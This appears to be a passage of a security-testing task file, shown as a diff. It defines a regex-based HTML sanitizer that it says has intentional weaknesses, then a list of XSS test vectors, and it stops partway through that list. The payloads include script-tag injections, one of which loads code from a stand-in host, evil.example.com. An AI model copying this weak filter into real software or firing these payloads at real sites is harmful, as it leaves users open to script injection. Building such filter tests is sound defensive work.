@@ -1,0 +1,132 @@
+```python
+#!/usr/bin/env python3
+"""
+XSS Filter Testing with HTML Sanitization
+Terminal Task: Security Testing Module
+"""
+
+import re
+import html
+import json
+from typing import Optional
+
+
+# ============================================================
+# HTML SANITIZER IMPLEMENTATION
+# ============================================================
+
+class HTMLSanitizer:
+    """
+    A basic HTML sanitizer that attempts to prevent XSS attacks.
+    This implementation has intentional weaknesses for testing purposes.
+    """
+
+    ALLOWED_TAGS = {
+        'p', 'br', 'strong', 'em', 'u', 'ol', 'ul', 'li',
+        'h1', 'h2', 'h3', 'blockquote', 'code', 'pre'
+    }
+
+    ALLOWED_ATTRIBUTES = {
+        'href', 'title', 'class'
+    }
+
+    def __init__(self, strict_mode: bool = False):
+        self.strict_mode = strict_mode
+        self.blocked_patterns = [
+            r'javascript:',
+            r'vbscript:',
+            r'on\w+\s*=',
+        ]
+
+    def sanitize(self, input_html: str) -> str:
+        """
+        Sanitize HTML input to prevent XSS.
+        Returns sanitized HTML string.
+        """
+        if not input_html:
+            return ""
+
+        # Step 1: Remove script tags
+        result = re.sub(
+            r'<script[^>]*>.*?</script>',
+            '',
+            input_html,
+            flags=re.IGNORECASE | re.DOTALL
+        )
+
+        # Step 2: Remove event handlers (basic pattern)
+        result = re.sub(
+            r'\bon\w+\s*=\s*["\'][^"\']*["\']',
+            '',
+            result,
+            flags=re.IGNORECASE
+        )
+
+        # Step 3: Block javascript: protocol
+        result = re.sub(
+            r'javascript\s*:',
+            'blocked:',
+            result,
+            flags=re.IGNORECASE
+        )
+
+        # Step 4: In strict mode, escape all remaining HTML
+        if self.strict_mode:
+            result = html.escape(result)
+
+        return result
+
+    def is_safe(self, input_html: str) -> bool:
+        """
+        Check if input appears safe (no XSS patterns detected).
+        Returns True if input seems safe, False otherwise.
+        """
+        for pattern in self.blocked_patterns:
+            if re.search(pattern, input_html, re.IGNORECASE):
+                return False
+        return True
+
+
+# ============================================================
+# XSS TEST VECTORS
+# ============================================================
+
+XSS_TEST_VECTORS = [
+    # --- Basic Script Injection ---
+    {
+        "id": "XSS-001",
+        "category": "Basic Script Tag",
+        "description": "Standard script tag injection",
+        "payload": "<script>alert('XSS')</script>",
+        "expected_blocked": True,
+        "severity": "HIGH"
+    },
+    {
+        "id": "XSS-002",
+        "category": "Basic Script Tag",
+        "description": "Script tag with src attribute",
+        "payload": "<script src='http://evil.example.com/xss.js'></script>",
+        "expected_blocked": True,
+        "severity": "HIGH"
+    },
+    {
+        "id": "XSS-003",
+        "category": "Basic Script Tag",
+        "description": "Script tag with uppercase",
+        "payload": "<SCRIPT>alert('XSS')</SCRIPT>",
+        "expected_blocked": True,
+        "severity": "HIGH"
+    },
+    {
+        "id": "XSS-004",
+        "category": "Basic Script Tag",
+        "description": "Script tag with mixed case",
+        "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
+        "expected_blocked": True,
+        "severity": "HIGH"
+    },
+
+    # --- Event Handler Injection ---
+    {
+        "id": "XSS-010",
+        
